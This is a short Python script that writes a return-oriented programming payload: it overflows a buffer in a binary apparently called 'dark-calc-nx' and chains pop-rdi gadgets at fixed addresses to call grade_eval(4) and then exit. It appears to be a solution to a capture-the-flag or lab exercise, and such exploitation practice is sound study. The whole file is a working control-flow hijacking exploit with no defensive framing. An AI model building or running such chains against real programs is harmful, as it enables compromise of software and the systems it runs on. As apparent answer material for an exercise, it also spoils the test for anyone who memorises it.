#!/usr/bin/env python3
"""Call grade_eval(4) on dark-calc-nx with a return-oriented chain."""
import struct
import sys


def address(value):
    return struct.pack("<Q", value)


pop_rdi_ret = 0x401A33
ret = 0x401A34
grade_eval = 0x401978
exit_plt = 0x4016E0

# pop rdi; 4; ret; grade_eval(4); pop rdi; 4; ret; exit(4)
# The extra `ret` instructions restore the SysV AMD64 stack alignment, and the
# second pop rdi makes the exit status deterministic instead of inheriting the
# leftover rdi from grade_eval's fflush() call.
chain = [pop_rdi_ret, 4, ret, grade_eval,
         pop_rdi_ret, 4, ret, exit_plt, 0]
payload = b"A" * 16 + b"B" * 8 + b"".join(map(address, chain))
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
